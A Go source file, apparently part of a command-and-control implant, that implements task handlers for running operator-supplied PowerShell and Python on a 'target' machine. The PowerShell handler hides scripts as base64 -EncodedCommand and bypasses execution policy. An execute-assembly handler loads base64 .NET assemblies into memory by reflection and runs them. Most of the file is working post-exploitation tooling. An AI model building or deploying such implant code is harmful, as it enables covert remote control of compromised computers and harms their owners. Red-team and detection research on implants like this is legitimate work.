package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"unicode/utf16"
)

type scriptResult struct {
	ExitCode int    `json:"exit_code"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
}

// parseScriptArgs accepts either a raw script or {"script": "..."} /
// {"code": "..."} so the CLI can pass code without JSON-escaping by hand.
func parseScriptArgs(args string) (string, error) {
	trimmed := strings.TrimSpace(args)
	if trimmed == "" {
		return "", fmt.Errorf("a script is required")
	}
	if strings.HasPrefix(trimmed, "{") {
		var req struct {
			Script string `json:"script"`
			Code   string `json:"code"`
		}
		if err := json.Unmarshal([]byte(trimmed), &req); err == nil {
			if req.Script != "" {
				return req.Script, nil
			}
			if req.Code != "" {
				return req.Code, nil
			}
		}
	}
	return args, nil
}

func handlePowershell(ctx context.Context, args string) (string, error) {
	script, err := parseScriptArgs(args)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("powershell is only available on Windows")
	}
	return runPowershell(ctx, script)
}

func runPowershell(ctx context.Context, script string) (string, error) {
	encoded := base64.StdEncoding.EncodeToString(encodeUTF16LE(script))
	cmd := exec.CommandContext(ctx, "powershell.exe",
		"-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
		"-EncodedCommand", encoded)
	return runScript(cmd)
}

// maxAssemblyBytes bounds the base64 assembly payload accepted in one task.
const maxAssemblyBytes = 32 << 20

// handleExecuteAssembly loads a .NET assembly into a PowerShell process and
// invokes its entry point. It deliberately runs in PowerShell rather than in
// the implant: the base implant is CGO-free and carries no CLR host.
func handleExecuteAssembly(ctx context.Context, args string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute_assembly is only available on Windows")
	}
	var req struct {
		Assembly  string   `json:"assembly"`
		Arguments []string `json:"arguments,omitempty"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		return "", fmt.Errorf("execute_assembly args must be JSON: %w", err)
	}
	if req.Assembly == "" {
		return "", fmt.Errorf("execute_assembly requires base64 assembly bytes")
	}
	raw, err := base64.StdEncoding.DecodeString(req.Assembly)
	if err != nil {
		return "", fmt.Errorf("assembly must be base64: %w", err)
	}
	if len(raw) > maxAssemblyBytes {
		return "", fmt.Errorf("assembly exceeds the %d-byte limit", maxAssemblyBytes)
	}
	return runPowershell(ctx, assemblyScript(req.Assembly, req.Arguments))
}

// assemblyScript builds the PowerShell loader. Arguments are single-quoted
// with doubled quotes, and the base64 payload is alphabet-safe.
func assemblyScript(assemblyB64 string, arguments []string) string {
	quoted := make([]string, 0, len(arguments))
	for _, arg := range arguments {
		quoted = append(quoted, "'"+strings.ReplaceAll(arg, "'", "''")+"'")
	}
	argsExpr := "@()"
	if len(quoted) > 0 {
		argsExpr = "@(" + strings.Join(quoted, ",") + ")"
	}
	return "$a=[Convert]::FromBase64String('" + assemblyB64 + "'); " +
		"$asm=[Reflection.Assembly]::Load($a); " +
		"$argArr=[string[]]" + argsExpr + "; " +
		"$asm.EntryPoint.Invoke($null, @(,$argArr))"
}

func handlePython(ctx context.Context, args string) (string, error) {
	script, err := parseScriptArgs(args)
	if err != nil {
		return "", err
	}
	interpreter, err := exec.LookPath("python3")
	if err != nil {
		interpreter, err = exec.LookPath("python")
		if err != nil {
			return "", fmt.Errorf("python is not installed on the target")
		}
	}
	cmd := exec.CommandContext(ctx, interpreter, "-c", script)
	return runScript(cmd)
}

func runScript(cmd *exec.Cmd) (string, error) {
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	result := scriptResult{}
	runErr := cmd.Run()
	result.Stdout = stdout.String()
	result.Stderr = stderr.String()
	if runErr != nil {
		var exitErr *exec.ExitError
		if errors.As(runErr, &exitErr) {
			result.ExitCode = exitErr.ExitCode()
		} else {
			return "", runErr
		}
	}
	return marshalJSON(result)
}

// encodeUTF16LE converts a script to the encoding -EncodedCommand expects.
func encodeUTF16LE(s string) []byte {
	units := utf16.Encode([]rune(s))
	out := make([]byte, len(units)*2)
	for i, u := range units {
		out[i*2] = byte(u)
		out[i*2+1] = byte(u >> 8)
	}
	return out
}
